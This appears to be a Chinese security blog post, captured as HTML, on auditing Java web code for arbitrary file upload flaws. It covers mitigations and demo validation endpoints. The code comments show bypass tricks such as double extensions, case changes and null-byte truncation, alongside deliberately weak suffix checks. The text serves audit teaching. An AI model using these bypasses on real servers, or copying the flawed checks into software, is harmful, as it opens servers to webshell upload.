

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="白给">
  <meta name="keywords" content="">
  
    <meta name="description" content="java代码审计之任意文件上传漏洞及常见框架getshell分析一、任意文件上传漏洞漏洞简介任意文件上传漏洞（Arbitrary File Upload Vulnerability）是一种安全漏洞，攻击者通过该漏洞可以向服务器上传任意类型的文件，从而可能导致服务器被攻击者控制或者被用于存储恶意文件。 攻击者通常会利用网站上的文件上传功能或者通过Web应用程序中的漏洞上传恶意文件。攻击者可以上传任意">
<meta property="og:type" content="article">
<meta property="og:title" content="java代码审计之任意文件上传漏洞及常见框架getshell分析">
<meta property="og:url" content="http://example.com/2023/04/10/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%A1%86%E6%9E%B6getshell%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="白给&#39;s Blog">
<meta property="og:description" content="java代码审计之任意文件上传漏洞及常见框架getshell分析一、任意文件上传漏洞漏洞简介任意文件上传漏洞（Arbitrary File Upload Vulnerability）是一种安全漏洞，攻击者通过该漏洞可以向服务器上传任意类型的文件，从而可能导致服务器被攻击者控制或者被用于存储恶意文件。 攻击者通常会利用网站上的文件上传功能或者通过Web应用程序中的漏洞上传恶意文件。攻击者可以上传任意">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/image-0.png">
<meta property="og:image" content="http://example.com/image/image-1.png">
<meta property="og:image" content="http://example.com/image/image-2.png">
<meta property="og:image" content="http://example.com/image/image-3.png">
<meta property="og:image" content="http://example.com/image/image-4.png">
<meta property="og:image" content="http://example.com/image/image-5.png">
<meta property="og:image" content="http://example.com/image/image-6.png">
<meta property="og:image" content="http://example.com/image/image-7.png">
<meta property="og:image" content="http://example.com/image/image-8.png">
<meta property="og:image" content="http://example.com/image/image-9.png">
<meta property="og:image" content="http://example.com/image/image-10.png">
<meta property="og:image" content="http://example.com/image/image-11.png">
<meta property="og:image" content="http://example.com/image/image-30.png">
<meta property="og:image" content="http://example.com/image/image-31.png">
<meta property="og:image" content="http://example.com/image/image-13.png">
<meta property="og:image" content="http://example.com/image/image-14.png">
<meta property="og:image" content="http://example.com/image/image-15.png">
<meta property="og:image" content="http://example.com/image/image-16.png">
<meta property="og:image" content="http://example.com/image/image-17.png">
<meta property="og:image" content="http://example.com/image/image-18.png">
<meta property="og:image" content="http://example.com/image/image-19.png">
<meta property="og:image" content="http://example.com/image/image-20.png">
<meta property="og:image" content="http://example.com/image/image-21.png">
<meta property="og:image" content="http://example.com/image/image-22.png">
<meta property="og:image" content="http://example.com/image/image-23.png">
<meta property="og:image" content="http://example.com/image/image-24.png">
<meta property="og:image" content="http://example.com/image/image-25.png">
<meta property="og:image" content="http://example.com/image/image-26.png">
<meta property="og:image" content="http://example.com/image/image-27.png">
<meta property="og:image" content="http://example.com/image/image-28.png">
<meta property="og:image" content="http://example.com/image/image-29.png">
<meta property="article:published_time" content="2023-04-10T13:41:30.000Z">
<meta property="article:modified_time" content="2024-01-08T13:56:29.926Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/image/image-0.png">
  
  
  
  <title>java代码审计之任意文件上传漏洞及常见框架getshell分析 - 白给&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>白给&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/playlist/" target="_self">
                <i class="iconfont icon-music"></i>
                <span>音乐</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="java代码审计之任意文件上传漏洞及常见框架getshell分析"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-04-10 21:41" pubdate>
          2023年4月10日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          10k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          88 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">java代码审计之任意文件上传漏洞及常见框架getshell分析</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="java代码审计之任意文件上传漏洞及常见框架getshell分析"><a href="#java代码审计之任意文件上传漏洞及常见框架getshell分析" class="headerlink" title="java代码审计之任意文件上传漏洞及常见框架getshell分析"></a>java代码审计之任意文件上传漏洞及常见框架getshell分析</h1><h2 id="一、任意文件上传漏洞"><a href="#一、任意文件上传漏洞" class="headerlink" title="一、任意文件上传漏洞"></a>一、任意文件上传漏洞</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>任意文件上传漏洞（Arbitrary File Upload Vulnerability）是一种安全漏洞，攻击者通过该漏洞可以向服务器上传任意类型的文件，从而可能导致服务器被攻击者控制或者被用于存储恶意文件。</p>
<p>攻击者通常会利用网站上的文件上传功能或者通过Web应用程序中的漏洞上传恶意文件。攻击者可以上传任意类型的文件，包括恶意软件、木马、脚本文件等。一旦上传成功，攻击者可以通过利用该文件实施各种攻击，例如执行任意代码、访问敏感数据等。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>任意文件上传漏洞的原理是攻击者通过绕过上传文件类型的限制，向Web应用程序上传任意类型的文件，并将其保存在服务器上。攻击者通常会通过以下方式利用该漏洞：</p>
<ol>
<li>绕过文件类型限制：攻击者通过更改文件扩展名或者伪造MIME类型等方式来绕过文件类型限制，以上传非法文件。</li>
<li>利用文件上传路径的漏洞：攻击者可以通过访问上传文件的路径来获取上传的文件，然后执行上传的文件中的恶意代码。</li>
<li>利用文件上传后的恶意操作：攻击者可以上传一个包含恶意代码的文件，并通过Web应用程序对其执行操作，从而导致服务器受到攻击。</li>
<li>利用未授权的文件上传功能：攻击者可以利用未授权的文件上传功能，绕过用户认证，上传恶意文件，然后在服务器上执行。</li>
</ol>
<p>一旦攻击者上传了恶意文件，他们可以通过执行其中的代码获取到webshell</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>为了防止任意文件上传漏洞，开发者可以采取以下措施：</p>
<p>对上传的文件类型进行限制，只允许上传必需的文件类型，例如图片、文档等。可以使用文件扩展名过滤器或者文件类型检查器等技术来实现。</p>
<ol>
<li>对上传的文件进行校验和过滤，检查是否包含可执行的代码、恶意脚本等，可以使用文件内容过滤器等技术来实现。</li>
<li>对上传的文件进行重命名，避免攻击者上传已经存在的文件并且可以难以猜测上传路径，例如使用随机的文件名和目录名。</li>
<li>实现合适的文件上传权限控制，确保只有授权的用户可以上传文件，同时确保上传的文件只能被授权的用户访问。</li>
<li>对于已知的任意文件上传漏洞，及时修补和升级相关软件或者应用程序，以避免被攻击。</li>
</ol>
<h2 id="二、任意文件上传漏洞代码审计"><a href="#二、任意文件上传漏洞代码审计" class="headerlink" title="二、任意文件上传漏洞代码审计"></a>二、任意文件上传漏洞代码审计</h2><p>注：以下分析均为后端代码分析，不涉及前端</p>
<h3 id="1、查找文件上传功能点"><a href="#1、查找文件上传功能点" class="headerlink" title="1、查找文件上传功能点"></a>1、查找文件上传功能点</h3><p>以下为常见文件上传相关类及方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">FileUpload<br>FileUploadBase<br>FileItemIteratorImpl<br>FileItemStreamImpl<br>FileUtils<br>UploadHandleServlet<br>FileLoadServlet<br>FileOutputStream<br>DiskFileItemFactory<br>MultipartRequestEntity<br>MultipartFile<br>com.oreilly.servlet.MultipartRequest<br></code></pre></td></tr></table></figure>

<h3 id="2、审计校验上传文件类型限制"><a href="#2、审计校验上传文件类型限制" class="headerlink" title="2、审计校验上传文件类型限制"></a>2、审计校验上传文件类型限制</h3><p>以下为常见限制上传文件类型方式，实战中可能为以下限制方式其中之一也可能为多种限制方式组合使用。</p>
<h4 id="文件后缀限制"><a href="#文件后缀限制" class="headerlink" title="文件后缀限制"></a>文件后缀限制</h4><h5 id="黑名单校验"><a href="#黑名单校验" class="headerlink" title="黑名单校验"></a>黑名单校验</h5><p>黑名单校验即校验上传文件后缀是否在后缀黑名单中，若在黑名单中则上传失败。黑名单校验实战中已很少遇到,以下代码最简单黑名单校验方式，实际中代码肯定会更加复杂，但整体思路与demo中相同。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//黑名单文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload1&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload1</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span>&#123;<br>    <span class="hljs-comment">//获取上传文件名</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br>    <span class="hljs-comment">//获取文件后缀名，此处存在两个风险点</span><br>    <span class="hljs-comment">//1.获取获取文件名后缀是否获取最后一个.</span><br>    <span class="hljs-comment">//2.后缀是否统一转换为大写或小写</span><br>    <br>    <span class="hljs-comment">//问题1代码示例</span><br>    <span class="hljs-comment">//indexof(&quot;.&quot;)是从前往后取第一个.后的内容，可用多后缀绕过。例：xxx.jpg.jsp</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix1</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.indexOf(<span class="hljs-string">&quot;.&quot;</span>));<br><br>    <span class="hljs-comment">//问题2代码示例</span><br>    <span class="hljs-comment">//此处未统一不转为大写或小写,即可大小写绕过。例：xxx.jSp</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix2</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));<br><br>    <span class="hljs-comment">//正确获取后缀名</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)).toLowerCase();<br><br>    <span class="hljs-comment">//文件后缀黑名单</span><br>    String[] suffixList = &#123;<span class="hljs-string">&quot;.jsp&quot;</span>, <span class="hljs-string">&quot;.jspx&quot;</span>&#125;;<br><br>    <span class="hljs-keyword">for</span> (String s:suffixList)&#123;<br>        <span class="hljs-keyword">if</span>(s.equals(fileSuffix))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，不允许上传的文件类型&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//省略文件保存至服务器代码</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传成功&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="白名单校验"><a href="#白名单校验" class="headerlink" title="白名单校验"></a>白名单校验</h5><p>白名单校验即校验上传文件后缀是否在可上传后缀白名单中，若在白名单中则可成功上传，不在后缀白名单中则上传失败，实战中多为白名单校验。以下代码为最简单白名单校验方式，实际中代码肯定会更加复杂，但整体思路与demo中相同。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//白名单文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload2&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload2</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span>&#123;<br>    <span class="hljs-comment">//获取上传文件名</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br>    <span class="hljs-comment">//获取文件后缀名，此处存在两个风险点</span><br>    <span class="hljs-comment">//1.获取获取文件名后缀是否获取最后一个.</span><br>    <span class="hljs-comment">//2.后缀是否统一转换为大写或小写</span><br><br>    <span class="hljs-comment">//问题1代码示例</span><br>    <span class="hljs-comment">//indexof(&quot;.&quot;)是从前往后取第一个.后的内容，可用多后缀绕过。例：xxx.jpg.jsp</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix1</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.indexOf(<span class="hljs-string">&quot;.&quot;</span>));<br><br>    <span class="hljs-comment">//问题2代码示例</span><br>    <span class="hljs-comment">//此处未统一不转为大写或小写,即可大小写绕过。例：xxx.jSp</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix2</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));<br><br>    <span class="hljs-comment">//正确获取后缀名</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)).toLowerCase();<br><br><br>    <span class="hljs-comment">//后缀白名单</span><br>    String[] allowedExtension = &#123;<span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>&#125;;<br><br><br>    <span class="hljs-comment">//判断上传文件后缀是否在白名单中</span><br>    <span class="hljs-keyword">if</span> (isAllowedExtension(fileSuffix,allowedExtension))&#123;<br>        <span class="hljs-comment">//省略文件保存至服务器代码</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传成功&quot;</span>;<br><br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，不允许上传的文件类型&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//判断上传文件后缀是否在白名单中</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAllowedExtension</span><span class="hljs-params">(String extension, String[] allowedExtension)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (String str : allowedExtension)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (str.equalsIgnoreCase(extension))<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>1、00截断于jdk1.7.0_40被修复，此漏洞为JDK FileOutputStream写文件时的漏洞，与web代码开发无关，但可在web后端代码中对00截断相关字符进行过滤。</p>
<p>2、黑名单校验可利用Windows的命名机制绕过</p>
<h4 id="MIME-type限制"><a href="#MIME-type限制" class="headerlink" title="MIME type限制"></a>MIME type限制</h4><h5 id="Content-Type校验"><a href="#Content-Type校验" class="headerlink" title="Content-Type校验"></a>Content-Type校验</h5><p>Content-Type校验即获取ruquest请求header中”Content-Type”参数，若Content-Type合法则通过校验。以下代码为常见Content-Type校验方式，实际中代码肯定会更加复杂，但整体思路与demo中相同。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IMAGE_PNG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;image/png&quot;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IMAGE_JPG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;image/jpg&quot;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IMAGE_JPEG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IMAGE_GIF</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;image/gif&quot;</span>;<br><br><span class="hljs-comment">//Content-Type文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload3&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload3</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span>&#123;<br><br>    <span class="hljs-comment">//获取Content-Type</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> file.getContentType();<br><br>    <span class="hljs-comment">//根据Content-Type获取类型</span><br>    <span class="hljs-comment">//此处有也可直接判断获取到的Content-Type</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix</span> <span class="hljs-operator">=</span> getExtension(contentType);<br><br>    <span class="hljs-comment">//后缀白名单</span><br>    String[] allowedExtension = &#123;<span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>&#125;;<br><br>    <span class="hljs-comment">//判断上传文件后缀是否在白名单中</span><br>    <span class="hljs-keyword">if</span> (isAllowedExtension(fileSuffix,allowedExtension))&#123;<br>        <span class="hljs-comment">//省略文件保存至服务器代码</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传成功&quot;</span>;<br><br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，不允许上传的文件类型&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//根据Content-Type获取类型</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getExtension</span><span class="hljs-params">(String prefix)</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (prefix)<br>    &#123;<br>        <span class="hljs-keyword">case</span> IMAGE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;.png&quot;</span>;<br>        <span class="hljs-keyword">case</span> IMAGE_JPG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;.jpg&quot;</span>;<br>        <span class="hljs-keyword">case</span> IMAGE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;.jpeg&quot;</span>;<br>        <span class="hljs-keyword">case</span> IMAGE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;.gif&quot;</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="文件头校验"><a href="#文件头校验" class="headerlink" title="文件头校验"></a>文件头校验</h5><p>文件头校验即根据文件头内容获取文件类型，通常与Content-Type校验结合使用。先根据Content-Type获取文件类型，再根据文件头校验获取文件类型，若获取到的文件类型相同，则通过校验。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">注：<br><span class="hljs-number">1.</span>以下文件类型无固定文件头<br>TXT 没固定文件头定义<br>TMP 没固定文件头定义<br>INI 没固定文件头定义<br>BIN 没固定文件头定义<br>DBF 没固定文件头定义<br>C 没没固定文件头定义<br>CPP 没固定文件头定义<br>H 没固定文件头定义<br>BAT 没固定文件头定义<br><span class="hljs-number">2.</span>以下文件有相同的文件头<br>4D5A90 EXE<br>4D5A90 dll<br>4D5A90 OCX<br>4D5A90 OLB<br>4D5A90 IMM<br>4D5A90 IME<br>...<br></code></pre></td></tr></table></figure>

<p>以下代码为常见文件头校验方式，实际中代码肯定会更加复杂，但整体思路与demo中相同。</p>
